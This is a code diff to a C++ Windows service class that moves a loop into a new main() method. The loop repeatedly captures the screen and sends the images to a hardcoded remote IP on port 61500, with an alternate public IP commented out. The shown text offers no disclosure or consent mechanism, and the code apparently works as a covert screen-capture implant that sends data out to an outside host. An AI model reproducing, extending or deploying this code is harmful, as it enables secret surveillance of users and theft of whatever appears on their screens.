@@ -23,7 +23,33 @@ ServiceManager::ServiceManager(string name) {
 
 //------------------------------------------------------------------------------
 
-ServiceManager::~ServiceManager(void) {
+ServiceManager::~ServiceManager(void) {}
+
+//------------------------------------------------------------------------------
+
+void ServiceManager::main(void) {
+    ScreenManager screen_manager = ScreenManager();
+
+    // string hostname = "192.241.213.182";
+    string hostname = "192.168.0.118";
+    SOCKET socket = 0;
+
+    while (1) {
+        if (socket == 0) {
+            socket = connect(hostname, 61500);
+        }
+
+        if (socket != 0) {
+            string image = screen_manager.capture();
+            send_image(socket, image, hostname);
+        }
+
+        wait();
+    }
+
+    if (socket != 0) {
+        disconnect(socket);
+    }
 }
 
 //------------------------------------------------------------------------------
@@ -61,9 +87,6 @@ void ServiceManager::install(void) {
 
 //------------------------------------------------------------------------------
 
-void ServiceManager::debug(void) {}
-
-//------------------------------------------------------------------------------
 void ServiceManager::init(DWORD dwArgc, LPTSTR *lpszArgv) {
     this->ghSvcStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
 
@@ -74,28 +97,7 @@ void ServiceManager::init(DWORD dwArgc, LPTSTR *lpszArgv) {
 
     this->report_status(SERVICE_RUNNING, NO_ERROR, 0);
 
-    ScreenManager screen_manager = ScreenManager();
-
-    // string hostname = "192.241.213.182";
-    string hostname = "192.168.0.118";
-    SOCKET socket = 0;
-
-    while (1) {
-        if (socket == 0) {
-            socket = connect(hostname, 61500);
-        }
-
-        if (socket != 0) {
-            string image = screen_manager.capture();
-            send_image(socket, image, hostname);
-        }
-
-        wait();
-    }
-
-    if (socket != 0) {
-        disconnect(socket);
-    }
+    this->main();
 }
 
 //------------------------------------------------------------------------------
@@ -146,7 +148,7 @@ void ServiceManager::report_event(string event) {
         lpszStrings[0] = this->name.c_str();
         lpszStrings[1] = buffer.str().c_str();
 
-        ReportEvent(hEventSource, EVENTLOG_ERROR_TYPE, 0, 61500, NULL, 2, 0, lpszStrings, NULL);
+        ReportEvent(hEventSource, EVENTLOG_ERROR_TYPE, 0, 0, NULL, 2, 0, lpszStrings, NULL);
 
         DeregisterEventSource(hEventSource);
     }
